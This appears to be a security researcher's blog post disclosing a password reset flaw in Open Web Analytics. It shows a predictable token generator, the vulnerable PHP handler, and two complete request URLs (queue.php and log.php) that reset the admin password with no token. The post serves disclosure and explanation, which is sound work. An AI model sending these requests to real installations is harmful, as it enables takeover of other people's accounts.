---
layout: post
title: "Resetting any user's password in Open Web Analytics with a single request"
thumbnail: sheep-480.jpg
date: 2025-06-25
---

Open Web Analytics (OWA) is a web app that tracks website visitors. I discovered a simple way to reset any user's password, by simply requesting a URL.

## Introduction

OWA is a PHP application that has all of its files in the webroot and does not use a well-known framework, which makes it a good candidate to find vulnerabilities. I recently did a [Hack the Box](https://www.hackthebox.com/) exercise where the goal was to exploit [a vulnerability](https://devel0pment.de/?p=2494) in OWA. This gave the final push to seriously look into it.

OWA has typical password reset functionality that stores a random token in the database and mails it to the user. The password reset form authenticates the user with the token and resets the password if it matches. OWA calls the password reset token the "temp pass key", and it is generated using a predictable method, which lacks cryptographic randomness:

```php
function generateTempPasskey($user_id) {
    return md5($user_id.time().rand());
}
```

The values of `$user_id`, `time()` and `rand()` can be deduced, after which an attacker can create their own password reset token.

When looking how to exploit this, I figured out how the password reset mechanism worked and found a much simpler vulnerability.

## Password reset vulnerability

The application accepts a password reset event with only the user ID, completely bypassing the need for a reset token.

When a user wants to reset their password, they request a password reset email, receive a link with the password reset token, click the link and submits a new password. Then:

1. the new password and reset token are submitted to the application.
2. the application verifies the password reset token.
3. if it matches, it dispatches an event to set a new password for this user.
4. the event handler actually updates the password row in the database.

The event handler doesn't necessarily need the password reset token. It is also happy when given just the user ID:

```php
public function updateUserPassword($user_params)
{
    $u = owa_coreAPI::entityFactory('base.user');

    if (!isset($user_params['temp_passkey']) && !isset($user_params['user_id'])) {
        owa_coreAPI::error( "No user identification given!" );
        return false;
    }

    if (isset($user_params['temp_passkey'])) {
        $u->getByColumn('temp_passkey', $user_params['temp_passkey']);
    }

    if (isset($user_params['user_id'])) {
        $u->getByColumn('user_id', $user_params['user_id']);
    }

    $u->set('temp_passkey', $u->generateTempPasskey($user_params['user_id']));
    $u->set('password', owa_lib::encryptPassword($user_params['password']));
    $ret = $u->update();

    return $ret ? $u : false;
}
```

The normal flow first checks the password reset token and then dispatches the event. However, we can also dispatch such an event ourselves, through queue.php. This bypasses step 1 and 2 in the flow, and thus bypasses the first check on the password reset token. By including a user ID instead of a password reset token in the event, we also bypass the second check on the password reset token. So by dispatching an event and including a user ID and omitting the password reset token, we can reset any user's password. Requesting one of the URLs below set the password of user `admin` to `abc`:

```
queue.php?owa_event[eventType]=base.set_password&owa_event[properties][user_id]=admin&owa_event[properties][password]=abc&owa_event[properties][key]=

log.php?owa_event_type=base.set_password&owa_user_id=admin&owa_password=abc&owa_key=
```

## Read more

- [From Single / Double Quote Confusion To RCE (CVE-2022-24637) – devel0pment.de](https://devel0pment.de/?p=2494)

## Technical details

The password reset mechanism works through these classes/methods:

- the new password and the reset token are submitted to `index.php?owa_do=base.usersPasswordEntry`, along with a parameter `owa_action=base.usersChangePassword`.
- `owa_usersChangePasswordController` verifies the password reset token.
- If it matches, it creates a `base.set_password` event to reset the user's password.
- The event triggers `owa_usersSetPasswordController` (through `owa_userHandlers`).
- This calls `owa_userManager::updateUserPassword`, which actually updates the password row in the database.
